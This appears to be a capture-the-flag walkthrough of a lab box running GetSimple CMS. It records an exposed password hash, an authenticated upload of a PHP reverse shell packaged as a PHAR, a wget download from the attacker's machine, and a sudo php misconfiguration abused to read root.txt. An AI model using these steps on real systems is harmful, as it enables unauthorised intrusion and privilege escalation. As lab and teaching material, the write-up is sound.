# Target: GetSimple

## Notes:
1. Performed Initial scan with ```nmap -sV -sC -oA initial_scan 10.129.118.168```
 - Target has two open ports : 
   22/tcp (SSH)
   80/tcp (http) running on Apache/2.4.41
 - Operating System is likely Linux
2. Accessed the website, nothing interesting, just a home page with barely working buttons.
3. Accessing the robots.txt file we see the **/admin/** folder
4. Accessing it we get a prompt for logging in, i am gonna try a few things as the box is similar to nibbles
5. The site is probably gonna have some protection against brute forcing as nibbles did so i think it's better to search for clues, maybe the template they use has some info
6. i've opened the github repository of GetSimple https://github.com/GetSimpleCMS/GetSimpleCMS but didn't find anything interesting
7. Coming back to the website, i found a date there, maybe i can use this date (**February 9th, 2021**) to search for the release version of GetSimple used here
8. Last release according to the github repository is 3.3.16 released in 2020, which means the website actually uses the last release. Let's hope there are some vulnerabilities for it.
9. After searching i found a proof of concept on https://www.exploit-db.com/exploits/52168
 for an RCE. But we need access to the admin panel to upload our file for a reverse shell
10. Now let's try and find those credentials!
11. Okay so accessing http://10.129.118.168/data/users/admin.xml revealed the username of admin is (of course) **admin** and an interesting field:
<PWD>d033e22ae348aeb5660fc2140aec35850c4da997</PWD>
that looks like a hash. Let's try breaking it 

12. Perfect! our beloved https://crackstation.net/
    already knows this hash (of course it knows it cause it's "admin")
13. Yeah so the username is "admin" and the password is... "admin".
14. login on http://10.129.118.168/admin/
15. Nice, we have access to admin, now we have to build (download) a script for a reverse shell, follow the instruction from **exploit-db** and begin escalation
16. let's use this reverse shell script: https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
17. Don't forget to change the ip and port fields
18. rename it to index.php to be able to run the script provided on exploit-dp to generat the .phar file
19. To run this script i had to disable phar.readonly by setting it to Off and decommenting it from the php --ini file location. Finally the archive is created
20. Now we upload it and open a listener on our machine
21. Lol i can't find the upload button, gonna try a POST request with curl using credential cookies that i found in the developer tools
22. looking through the page source to search for the file input field name, i've found something interesting:
	<form class="uploadform" action="upload.php?path=" method="post" enctype="multipart/form-data">
			<p><input type="file" name="file[]" id="file" style="width:220px;" multiple /></p>
			<input type="hidden" name="hash" id="hash" value="e554e86a29ef7d32cfe35c3521dd5029b405992d" />
			<input type="submit" class="submit" name="submit" value="Upload" />
		</form>
See, the field is hidden. So the devs decided to do a little joke. still the curl was already built so i didn't bother changing the type of the input, however you can do this to upload the file more easily.
23. Here is the curl command i've used:
```curl -X POST http://10.129.118.168/admin/upload.php -H "Cookie: 4bc774744b09f4bb3746b641176918d9f52ef9b9=93faf1706c6b62a18553fe3cdf4e4c1015c73760; GS_ADMIN_USERNAME=admin" -F "file[]=@archive.phar"```
24. now let's open a listener and see if the shell works
25. Perfect, we've got our shell, let's beautify our terminal: ```python3 -c 'import os,pty; pty.spawn("/bin/bash")'```
26. After searching for a while, the **user.txt** file is inside mrb3n user directory.

27. Now next step is to escalate privileges, let's upload to our server a script like **LinEnum** or **LinPEAS**
28. To upload a file we'll host a simple server on our main machine and use wget to download it
 host: ```python3 -m http.server 8000```
 download: Here we need to move to **/tmp** directory before downloading as the user doesn't have a home directory where we can write to. RUN:
 ```wget 10.10.14.99:8000/LinEnum.sh```
29. Change execution permissions and run the script
30. The results show an interesting message:
  [-] Accounts that have recently used sudo:
/home/mrb3n/.sudo_as_admin_successful
  and also:
  [+] We can sudo without supplying a password!
Matching Defaults entries for www-data on gettingstarted:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on gettingstarted:
    (ALL : ALL) NOPASSWD: /usr/bin/php

31. Let's firstly check what the php executable does
32. i've tried echo '<?php echo "Hello from stdin\n";' | ./php and bingo. it printed the message, so this executable runs commands as a sudo. let's use it to find the contents of root.txt 

33. Okay so i am a little bit stupid, the file can be executed as sudo, but not echo so i was wondering why:
```sudo echo "comand" | ./php wasn't working.```
34. the solution is  ```sudo ./php -r 'echo shell_exec("cat /root/root.txt");'``` to execute and find the flag
35. this is the last flag we had to find!